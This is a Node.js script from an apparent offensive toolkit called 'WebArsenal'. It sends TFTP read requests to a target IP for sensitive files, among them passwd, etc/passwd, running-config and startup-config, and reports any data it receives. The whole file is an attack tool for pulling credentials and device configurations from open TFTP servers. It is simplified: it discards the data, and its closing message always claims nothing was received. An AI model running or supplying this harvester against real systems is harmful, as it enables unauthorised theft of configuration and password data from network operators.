#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: tftp-file-harvester.js                             ║
 * ║  Category: scrapers                                             ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const dgram = require('dgram');

program
  .name('tftp-file-harvester.js')
  .description('Attempts to harvest common configuration files from an open TFTP server.')
  .version('4.0.0')
  .requiredOption('-i, --ip <ip>', 'Target IP address')
  .option('-p, --port <number>', 'TFTP port (default 69)', '69')
  .parse(process.argv);

const opts = program.opts();

const COMMON_CONFIGS = ['config.bin', 'running-config', 'passwd', 'etc/passwd', 'startup-config'];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'tftp-file-harvester.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const ip = opts.ip;
  const port = parseInt(opts.port);
  
  console.log(chalk.cyan(`[*] Attempting to harvest sensitive files from TFTP: ${ip}:${port}\n`));
  
  const client = dgram.createSocket('udp4');
  
  COMMON_CONFIGS.forEach(file => {
    process.stdout.write(chalk.gray(`[*] Requesting: ${file}... `));
    
    // TFTP Read Request (RRQ) Packet (Simplified)
    const rrq = Buffer.concat([
      Buffer.from([0x00, 0x01]), // Opcode 1 (RRQ)
      Buffer.from(file),
      Buffer.from([0x00]),
      Buffer.from('octet'),
      Buffer.from([0x00])
    ]);
    
    client.send(rrq, port, ip, (err) => {
       if (err) console.log(chalk.red('FAIL'));
    });
  });
  
  client.on('message', (msg, rinfo) => {
     if (msg[1] === 0x03) { // Opcode 3 (DATA)
        console.log(chalk.bold.red(`[!] SUCCESS: RECEIVED DATA for a file from ${rinfo.address}!`));
     } else if (msg[1] === 0x05) { // Opcode 5 (ERROR)
        // Check error code if needed
     }
  });

  setTimeout(() => {
     console.log(chalk.yellow(`\n\n[-] No data received (Simulation/Timeout).`));
     client.close();
  }, 5000);
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
